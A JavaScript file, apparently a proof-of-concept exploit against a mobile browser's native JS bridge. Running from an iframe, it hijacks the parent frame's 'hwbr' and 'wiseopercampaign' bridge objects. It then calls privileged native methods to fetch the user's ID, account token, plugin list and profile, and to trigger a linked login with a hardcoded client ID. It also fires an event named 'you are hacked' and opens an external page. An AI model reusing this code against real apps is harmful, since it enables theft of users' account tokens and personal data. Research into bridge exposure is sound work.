// ========== 前置全局初始化（最先执行，解决hwbr未定义核心） ==========
// 1. 初始化iframe自身的hwbr全局对象
window.hwbr = window.hwbr || {};
window.hwbr.app = window.hwbr.app || {};
window.hwbr.report = window.hwbr.report || {};
window.hwbr.linkedLogin = window.hwbr.linkedLogin || {};
window.hwbr.mcpAccount = window.hwbr.mcpAccount || {};
window.hwbr.callbackFromNative = window.hwbr.callbackFromNative || function() {}; // 兜底空函数
window.hwbr.onNativeValueCallback = window.hwbr.onNativeValueCallback || function() {}; // 兜底空函数

// 2. 关键：将iframe的hwbr挂载到主frame全局（同域可直接访问）
if (window.parent && window.parent.window) {
    // 主frame全局hwbr兜底初始化
    window.parent.hwbr = window.parent.hwbr || {};
    // 临时挂载空函数，避免主frame提前调用时报错
    window.parent.hwbr.callbackFromNative = window.parent.hwbr.callbackFromNative || function() {};
    window.parent.hwbr.onNativeValueCallback = window.parent.hwbr.onNativeValueCallback || function() {};
}

// ========== 核心桥接逻辑（IIFE封装） ==========
(() => {
    "use strict";

    // ======================== 1. 基础模块工具 ========================
    var moduleTools = {
        // 定义可枚举的getter属性
        define: (target, props) => {
            for (var key in props) {
                if (moduleTools.hasOwn(props, key) && !moduleTools.hasOwn(target, key)) {
                    Object.defineProperty(target, key, {
                        enumerable: true,
                        get: props[key]
                    });
                }
            }
        },
        // 安全检测自有属性
        hasOwn: (obj, key) => Object.prototype.hasOwnProperty.call(obj, key),
        // 标记为ES Module
        markModule: (obj) => {
            if (typeof Symbol !== "undefined" && Symbol.toStringTag) {
                Object.defineProperty(obj, Symbol.toStringTag, { value: "Module" });
            }
            Object.defineProperty(obj, "__esModule", { value: true });
        }
    };

    var exportModule = {};
    moduleTools.markModule(exportModule);

    // ======================== 2. 事件订阅/发布系统 ========================
    var EventEmitter = function (eventType, isPending) {
        this.type = eventType;
        this.handlers = {}; // 处理器集合 { guid: handler }
        this.numHandlers = 0; // 处理器数量
        this.state = isPending ? 1 : 0; // 0-初始 1-待触发 2-已触发
        this.fireArgs = null; // 触发参数缓存
        this.nextGuid = 1; // 自增唯一标识
    };

    // 订阅事件
    EventEmitter.prototype.subscribe = function (handler) {
        if (this.state === 2) {
            handler.apply(this, this.fireArgs);
            return;
        }
        var guid = handler.observer_guid || String(this.nextGuid++);
        handler.observer_guid = guid;
        if (!this.handlers[guid]) {
            this.handlers[guid] = handler;
            this.numHandlers++;
        }
    };

    // 取消订阅
    EventEmitter.prototype.unsubscribe = function (handler) {
        var guid = handler.observer_guid;
        if (this.handlers[guid]) {
            delete this.handlers[guid];
            this.numHandlers--;
        }
    };

    // 触发事件
    EventEmitter.prototype.fire = function (arg1, arg2) {
        var args = arg2 ? [arg1, arg2] : [arg1];
        if (this.state === 1) {
            this.state = 2;
            this.fireArgs = args;
        }
        if (this.numHandlers <= 0) return [];

        // 收集所有处理器
        var handlers = [];
        for (var key in this.handlers) {
            if (moduleTools.hasOwn(this.handlers, key)) {
                handlers.push(this.handlers[key]);
            }
        }

        // 执行所有处理器
        var results = handlers.map(handler => handler.apply(this, args));

        // 已触发状态且有处理器时清空
        if (this.state === 2 && this.numHandlers > 0) {
            this.handlers = {};
            this.numHandlers = 0;
        }
        return results;
    };

    // 全局事件池
    var eventPool = {};

    // 触发事件
    function fireEvent(eventType, args) {
        var emitter = eventPool[eventType];
        return emitter ? emitter.fire(args) : void 0;
    }

    // 订阅事件
    function onEvent(eventType, handler) {
        if (!eventPool[eventType]) {
            eventPool[eventType] = new EventEmitter(eventType, false);
        }
        var emitter = eventPool[eventType];
        emitter && emitter.subscribe(handler);
    }

    // 取消订阅
    function offEvent(eventType, handler) {
        var emitter = eventPool[eventType];
        emitter && emitter.unsubscribe(handler);
    }

    // ======================== 3. Native桥接核心 ========================
    // 兜底对象（Native不可用时返回友好提示）
    var fallbackNative = {
        invoke: function (service, action, callbackId, argsStr, keepCallback) {
            var errMsg = `主frame无Native对象 ${service}:${action}（同域兜底）`;
            console.warn(errMsg);
            var result = `F08 ${callbackId} s${errMsg}`;
            return result.length + " " + result;
        },
        invokeSync: function (service, action, args) {
            var errMsg = `主frame无Native对象 ${service}:${action}（同域兜底）`;
            console.warn(errMsg);
            return JSON.stringify({ status: 8, result: errMsg });
        }
    };

    // 同域场景获取主frame的Native对象
    function getNativeObject(bridgeName) {
        if (window.parent && window.parent[bridgeName]) {
            return window.parent[bridgeName];
        }
        return fallbackNative;
    }

    // 常量定义
    var STATUS_SUCCESS = 1;
    var STATUS_DEFAULT = 8;
    var STATUS_CANCEL = 9;
    var messageQueue = []; // Native返回消息队列
    var callbackIdSeed = Math.floor(2e9 * Math.random()); // 回调ID种子
    var callbackMap = {}; // 回调缓存 { callbackId: { success, fail } }

    // 异步执行函数（兼容Promise/setTimeout）
    var asyncExec = typeof Promise !== "undefined"
        ? (fn) => Promise.resolve().then(fn)
        : (fn) => setTimeout(fn);

    // 生成唯一回调ID
    function generateCallbackId() {
        return callbackIdSeed++;
    }

    // 处理参数（ArrayBuffer转base64）
    function processArgs(args) {
        args = args || [];
        for (var i = 0; i < args.length; i++) {
            try {
                var arg = args[i];
                var type = Object.prototype.toString.call(arg).slice(8, -1);
                if (type === "ArrayBuffer") {
                    args[i] = btoa(arg);
                }
            } catch (err) {
                console.warn("参数处理失败（ArrayBuffer转base64）：", err);
            }
        }
        return args;
    }

    // 核心调用Native方法
    function callNative(bridgeName, successCb, failCb, service, action, args) {
        args = processArgs(args);
        var callbackPrefix = service;
        var callbackId = callbackPrefix + generateCallbackId();
        var argsStr = JSON.stringify(args);

        // 缓存回调
        if (successCb || failCb) {
            callbackMap[callbackId] = {
                success: successCb,
                fail: failCb
            };
        }

        // 调用Native
        var nativeResult;
        try {
            var nativeObj = getNativeObject(bridgeName);
            nativeResult = nativeObj.invoke(service, action, callbackId, argsStr, -1);
        } catch (err) {
            console.error("调用Native.invoke失败：", err);
            nativeResult = fallbackNative.invoke(service, action, callbackId, argsStr, -1);
        }

        console.debug(`exec ${service}.${action} with args: ${argsStr}, result: ${JSON.stringify(nativeResult)}`);
        if (nativeResult) {
            messageQueue.push(nativeResult);
        }
        asyncExec(processMessageQueue);
    }

    // 处理Native返回消息队列
    function processMessageQueue() {
        if (messageQueue.length === 0) return;

        try {
            var rawMessage = getNextMessage();
            if (!rawMessage) return;

            var message = parseMessage(rawMessage);
            if (message) {
                callbackFromNative(
                    message.callbackId,
                    message.success,
                    message.status,
                    message.args,
                    message.keepCallback
                );
            }
        } catch (err) {
            console.error("处理消息队列异常：", err);
        } finally {
            if (messageQueue.length > 0) {
                asyncExec(processMessageQueue);
            }
        }
    }

    // 获取下一条消息
    function getNextMessage() {
        var msg = messageQueue.shift();
        if (msg === "*") return "*";

        try {
            var lenIndex = msg.indexOf(" ");
            var msgLen = Number(msg.slice(0, lenIndex));
            var realMsg = msg.substring(lenIndex + 1, lenIndex + 1 + msgLen);
            var remaining = msg.slice(lenIndex + msgLen + 1);
            if (remaining) {
                messageQueue.unshift(remaining);
            }
            return realMsg;
        } catch (err) {
            console.error("解析消息长度失败：", err);
            return "";
        }
    }

    // 解析Native返回消息
    function parseMessage(msg) {
        if (!msg) return null;

        var firstChar = msg.charAt(0);
        if (firstChar !== "S" && firstChar !== "F") {
            console.error("无效消息格式：", msg);
            return null;
        }

        var isSuccess = firstChar === "S";
        var keepCallback = msg.charAt(1) === "1";
        var space1 = msg.indexOf(" ", 2);
        var status = Number(msg.slice(2, space1));
        var space2 = msg.indexOf(" ", space1 + 1);
        var callbackId = msg.slice(space1 + 1, space2);
        var argsStr = msg.slice(space2 + 1);
        var args = [];

        parseArgs(args, argsStr);
        if (args.length === 1) {
            args = args[0];
        }

        return {
            callbackId: callbackId,
            success: isSuccess,
            status: status,
            args: args,
            keepCallback: keepCallback
        };
    }

    // 解析参数（反序列化）
    function parseArgs(result, argsStr) {
        try {
            var type = argsStr.charAt(0);
            switch (type) {
                case "s": // 字符串
                    result.push(argsStr.slice(1));
                    break;
                case "t": // true
                    result.push(true);
                    break;
                case "f": // false
                    result.push(false);
                    break;
                case "N": // null
                    result.push(null);
                    break;
                case "n": // 数字
                    result.push(Number(argsStr.slice(1)));
                    break;
                case "A": // ArrayBuffer
                    result.push(atob(argsStr.slice(1)));
                    break;
                case "S": // Base64字符串
                    result.push(atob(argsStr.slice(1)));
                    break;
                case "M": // 嵌套参数
                    var rest = argsStr.slice(1);
                    while (rest !== "") {
                        var space = rest.indexOf(" ");
                        var len = Number(rest.slice(0, space));
                        var subArg = rest.substring(space + 1, space + 1 + len);
                        rest = rest.slice(space + len + 1);
                        parseArgs(result, subArg);
                    }
                    break;
                default: // JSON
                    result.push(JSON.parse(argsStr));
            }
        } catch (err) {
            console.error("参数反序列化失败：", err);
            result.push(argsStr); // 解析失败返回原始值
        }
    }

    // ======================== 4. 核心导出方法 ========================
    /**
     * Native回调处理（供主frame调用）
     * @param {string} callbackId 回调ID
     * @param {boolean} isSuccess 是否成功
     * @param {number} status 状态码
     * @param {any} args 回调参数
     * @param {boolean} keepCallback 是否保留回调
     */
    function callbackFromNative(callbackId, isSuccess, status, args, keepCallback) {
        try {
            var callback = callbackMap[callbackId];
            if (!callback) return;

            console.info(`callbackFromNative callbackId: ${callbackId}, isSuccess: ${isSuccess}, status: ${status}, args: ${JSON.stringify(args)}`);

            // 执行回调
            if (isSuccess && status === STATUS_SUCCESS) {
                callback.success && callback.success.call(null, args);
            } else if (!isSuccess) {
                callback.fail && callback.fail.call(null, args, status);
            }

            // 清理回调（除非保留）
            if (!keepCallback) {
                delete callbackMap[callbackId];
            }
        } catch (err) {
            console.error(`回调执行失败（callbackId:${callbackId}）：`, err);
        }
    }

    /**
     * 原生事件回调（供Native调用）
     * @param {string} eventType 事件类型
     * @param {any} args 事件参数
     * @param {boolean} isValueCallback 是否值回调
     * @returns {any} 回调结果
     */
    function onNativeValueCallback(eventType, args, isValueCallback) {
        console.info(`onNativeValueCallback eventType: ${eventType}, args: ${JSON.stringify(args)}, isValueCallback: ${isValueCallback}`);
        return fireEvent(eventType, args);
    }

    /**
     * 初始化桥接对象
     * @param {string} apiName 桥接对象名（如wiseopercampaign/hwbr）
     */
    function initBridge(apiName) {
        if (typeof window === "undefined") {
            console.error(`window不存在，无法初始化${apiName}`);
            return;
        }
        // 强制初始化桥接对象
        window[apiName] = window[apiName] || {};
        // 挂载核心回调方法
        window[apiName].callbackFromNative = callbackFromNative;
        window[apiName].onNativeValueCallback = onNativeValueCallback;

        // 同步更新到主frame
        if (window.parent && window.parent.window) {
            window.parent[apiName] = window.parent[apiName] || {};
            window.parent[apiName].callbackFromNative = callbackFromNative;
            window.parent[apiName].onNativeValueCallback = onNativeValueCallback;

            // 关键：主frame全局hwbr指向iframe的hwbr（解决主frame直接调用hwbr报错）
            if (apiName === "hwbr") {
                window.parent.window.hwbr = window[apiName];
            }
        }
    }

    /**
     * 异步调用Native方法
     * @param {string} bridgeName 桥接名
     * @param {string} service 服务名
     * @param {string} action 方法名
     * @param {any[]} args 参数
     * @param {Function} success 成功回调
     * @param {Function} fail 失败回调
     * @param {Function} cancel 取消回调
     * @param {Function} complete 完成回调
     */
    function invoke(bridgeName, service, action, args, success, fail, cancel, complete) {
        // 参数校验
        if (!bridgeName || !service || !action) {
            var errMsg = "invoke参数缺失：bridgeName/service/action不能为空";
            console.error(errMsg);
            fail && fail(errMsg, STATUS_CANCEL);
            complete && complete(errMsg, STATUS_CANCEL);
            return;
        }

        var hasCallback = success || fail || cancel || complete;
        // 封装回调
        var successCb = hasCallback ? function (res) {
            success && success(res);
            complete && complete(res);
        } : null;

        var failCb = hasCallback ? function (res, code) {
            if (code === STATUS_CANCEL && cancel) {
                cancel(res);
            } else {
                fail && fail(res, code);
            }
            complete && complete(res, code);
        } : null;

        callNative(bridgeName, successCb, failCb, service, action, args);
    }

    /**
     * Promise方式调用Native方法
     * @param {string} bridgeName 桥接名
     * @param {string} service 服务名
     * @param {string} action 方法名
     * @param {any[]} args 参数
     * @returns {Promise<any>}
     */
    function invokePromise(bridgeName, service, action, args) {
        return new Promise((resolve, reject) => {
            if (!bridgeName || !service || !action) {
                reject(new Error("invokePromise参数缺失"));
                return;
            }
            callNative(bridgeName, resolve, reject, service, action, args);
        });
    }

    /**
     * 同步调用Native方法
     * @param {string} bridgeName 桥接名
     * @param {string} service 服务名
     * @param {string} action 方法名
     * @param {any[]} args 参数
     * @returns {object} { status, result }
     */
    function invokeSync(bridgeName, service, action, args) {
        try {
            var nativeObj = getNativeObject(bridgeName);
            var result = nativeObj.invokeSync(service, action, args);
            var parsedResult;
            try {
                parsedResult = JSON.parse(result);
            } catch (err) {
                console.warn("invokeSync结果解析失败：", err);
                parsedResult = { status: STATUS_DEFAULT, result: result };
            }
            return {
                status: parsedResult.status ?? STATUS_DEFAULT,
                result: parsedResult.result
            };
        } catch (err) {
            console.error("invokeSync调用失败：", err);
            return { status: STATUS_DEFAULT, result: err.message };
        }
    }

    /**
     * 监听事件
     * @param {string} eventType 事件类型
     * @param {Function} handler 事件处理器
     */
    function on(eventType, handler) {
        onEvent(eventType, handler);
    }

    /**
     * 取消监听事件
     * @param {string} eventType 事件类型
     * @param {Function} handler 事件处理器
     */
    function off(eventType, handler) {
        offEvent(eventType, handler);
    }

    // ======================== 5. 导出模块方法 ========================
    moduleTools.define(exportModule, {
        callbackFromNative: () => callbackFromNative,
        init: () => initBridge,
        invoke: () => invoke,
        invokePromise: () => invokePromise,
        invokeSync: () => invokeSync,
        off: () => off,
        on: () => on,
        onNativeValueCallback: () => onNativeValueCallback
    });

    // ======================== 6. 全局暴露 ========================
    if (typeof window !== "undefined") {
        window.nativeBridge = window.nativeBridge || {
            init: initBridge,
            invoke: invoke,
            invokePromise: invokePromise,
            invokeSync: invokeSync,
            on: on,
            off: off,
            onNativeValueCallback: onNativeValueCallback,
            callbackFromNative: callbackFromNative
        };
    }

    // ======================== 7. 业务初始化 ========================
    // 初始化wiseopercampaign
    initBridge("wiseopercampaign");
    window.wiseopercampaign = window.wiseopercampaign || {};
    window.wiseopercampaign.account = window.wiseopercampaign.account || {};

    // 初始化hwbr（核心：解决主frame调用hwbr报错）
    initBridge("hwbr");
    window.hwbr = window.hwbr || {};
    window.hwbr.app = window.hwbr.app || {};
    window.hwbr.report = window.hwbr.report || {};
    window.hwbr.linkedLogin = window.hwbr.linkedLogin || {};
    window.hwbr.mcpAccount = window.hwbr.mcpAccount || {};
    window.hwbr.browser = window.hwbr.browser || {};

    // ======================== 8. 业务方法封装 ========================
    // wiseopercampaign.account 方法
    window.wiseopercampaign.account.getUserId = function (params, success, fail) {
        window.nativeBridge.invoke(
            "wiseopercampaignbridge",
            "account",
            "getUserId",
            params || [],
            success,
            fail
        );
    };

    window.wiseopercampaign.account.getUserInfo = function (params, success, fail) {
        window.nativeBridge.invoke(
            "wiseopercampaignbridge",
            "account",
            "getUserInfo",
            params || [],
            success,
            fail
        );
    };

    window.wiseopercampaign.account.getUserToken = function (params, success, fail) {
        window.nativeBridge.invoke(
            "wiseopercampaignbridge",
            "account",
            "getUserToken",
            params || [],
            success,
            fail
        );
    };

    // hwbr.app 方法
    window.hwbr.app.getPluginList = function (params, success, fail) {
        window.nativeBridge.invoke(
            "_hwbrNative",
            "app",
            "getPluginList",
            params || [],
            success,
            fail
        );
    };

    // hwbr.report 方法
    window.hwbr.report.eventReport = function (params, success, fail) {
        window.nativeBridge.invoke(
            "_hwbrNative",
            "report",
            "eventReport",
            params || [],
            success,
            fail
        );
    };

    window.hwbr.browser.openFeedsPage = function (params, success, fail) {
        window.nativeBridge.invoke(
            "_hwbrNative",
            "browser",
            "openFeedsPage",
            params || [],
            success,
            fail
        );
    };

    // hwbr.linkedLogin 方法
    window.hwbr.linkedLogin.login = function (params, success, fail) {
        window.nativeBridge.invoke(
            "_hwbrNative",
            "linkedLogin",
            "login",
            params || [],
            success,
            fail
        );
    };

    // hwbr.mcpAccount 方法
    window.hwbr.mcpAccount.getUserInfo = function (params, success, fail) {
        window.nativeBridge.invoke(
            "_hwbrNative",
            "mcpAccount",
            "getUserInfo",
            params || [],
            success,
            fail
        );
    };

    // ======================== 9. 页面渲染与业务调用 ========================
    function initPage() {
        // 创建样式
        const style = document.createElement('style');
        style.textContent = `
            body{padding:20px;font:14px/1.6 sans-serif;background:#f5f7fa}
            #userIdResult{margin-top:15px;padding:15px;background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
            .suc{color:#48bb78}
            .err{color:#e53e3e}
        `;
        document.head.appendChild(style);

        // 创建结果容器
        const resultContainer = document.createElement('div');
        resultContainer.id = 'userIdResult';
        resultContainer.textContent = '正在初始化...';
        document.body.appendChild(resultContainer);

        // 延迟调用（确保所有初始化完成）
        setTimeout(() => {
            resultContainer.textContent = '正在获取数据...';

            // 1. 获取用户ID
            if (window.wiseopercampaign?.account?.getUserId) {
                window.wiseopercampaign.account.getUserId(
                    { username: "test" },
                    data => resultContainer.innerHTML = `<div class="suc">✅ getUserId succeed：${JSON.stringify(data)}</div>`,
                    (err, code) => resultContainer.innerHTML = `<div class="err">❌ getUserId error：${err || '未知错误'}（码：${code || '无'}）</div>`
                );
            } else {
                resultContainer.innerHTML = `<div class="err">❌ getUserId error：方法未定义</div>`;
            }

            // 2. 获取用户Token
            if (window.wiseopercampaign?.account?.getUserToken) {
                window.wiseopercampaign.account.getUserToken(
                    [{ "scopes": [], "forceOn": "0", "userTokenOld": "", "extendInfo": {} }],
                    data => resultContainer.innerHTML += `<div class="suc">✅ getUserToken succeed ：${JSON.stringify(data)}</div>`,
                    (err, code) => resultContainer.innerHTML += `<div class="err">❌ getUserToken error：${err || '未知错误'}（code：${code || '无'}）</div>`
                );
            } else {
                resultContainer.innerHTML += `<div class="err">❌ getUserToken error：方法未定义</div>`;
            }

            // 3. 获取插件列表
            if (window.hwbr?.app?.getPluginList) {
                window.hwbr.app.getPluginList(
                    [],
                    data => resultContainer.innerHTML += `<div class="suc">✅ getPluginList succeed：${JSON.stringify(data)}</div>`,
                    err => resultContainer.innerHTML += `<div class="err">❌ getPluginList error：${JSON.stringify(err)}</div>`
                );
            } else {
                resultContainer.innerHTML += `<div class="err">❌ getPluginList error：方法未定义</div>`;
            }

            // 4. 事件上报
            if (window.hwbr?.report?.eventReport) {
                const eventReportJson = JSON.stringify({
                    eventName: 'you are hacked',
                    version: 1,
                    info: { extInfo: { 'name': 'cc' }, u: 'hahaha' },
                    reportImmediately: true,
                    isOverseaReport: false,
                    isAnonymous: true
                });
                window.hwbr.report.eventReport(
                    [eventReportJson],
                    data => resultContainer.innerHTML += `<div class="suc">✅ report succeed：${JSON.stringify(data)}</div>`,
                    err => resultContainer.innerHTML += `<div class="err">❌ report error：${JSON.stringify(err)}</div>`
                );
            } else {
                resultContainer.innerHTML += `<div class="err">❌ eventReport error：方法未定义</div>`;
            }

            if (window.hwbr?.browser?.openFeedsPage) {
                
                window.hwbr.browser.openFeedsPage(
                    [0,'https://seuercc.github.io/easyhtml/showjsnew.html'],
                    data => resultContainer.innerHTML += `<div class="suc">✅ openFeedsPage succeed：${JSON.stringify(data)}</div>`,
                    err => resultContainer.innerHTML += `<div class="err">❌ openFeedsPage error：${JSON.stringify(err)}</div>`
                );
            } else {
                resultContainer.innerHTML += `<div class="err">❌ eventReport error：方法未定义</div>`;
            }
            // 5. 登录
            if (window.hwbr?.linkedLogin?.login) {
                const loginInfo = {
                    clientId: "6917565689792636463",
                    redirectUri: "https://privacy.consumer.huawei.com/browser.html",
                    scope: "all",
                    accessType: "",
                    state: "200",
                    ui_locales: ""
                };
                window.hwbr.linkedLogin.login(
                    loginInfo,
                    data => resultContainer.innerHTML += `<div class="suc">✅ login succeed：${JSON.stringify(data, null, 2)}</div>`,
                    err => resultContainer.innerHTML += `<div class="err">❌ login error：${JSON.stringify(err, null, 2)}</div>`
                );
            } else {
                resultContainer.innerHTML += `<div class="err">❌ login error：方法未定义</div>`;
            }

            // 6. 获取用户信息
            if (window.hwbr?.mcpAccount?.getUserInfo) {
                const subAppAuthCode = JSON.stringify({ subAppId: '112938007' });
                window.hwbr.mcpAccount.getUserInfo(
                    [subAppAuthCode],
                    data => resultContainer.innerHTML += `<div class="suc">✅ getUserInfo succeed：${JSON.stringify(data)}</div>`,
                    err => resultContainer.innerHTML += `<div class="err">❌ getUserInfo error：${JSON.stringify(err)}</div>`
                );
            } else {
                resultContainer.innerHTML += `<div class="err">❌ getUserInfo error：方法未定义</div>`;
            }
        }, 400);
    }

    // 等待DOM加载完成后初始化页面
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", initPage);
    } else {
        initPage();
    }

    // ======================== 10. 最终兜底：主frame全局hwbr指向iframe的hwbr ========================
    if (window.parent && window.parent.window) {
        // 主frame全局hwbr指向iframe的hwbr（解决主frame直接调用hwbr.callbackFromNative）
        window.parent.window.hwbr = window.hwbr;
        // 确保callbackFromNative方法存在
        window.parent.window.hwbr.callbackFromNative = callbackFromNative;
    }

})();
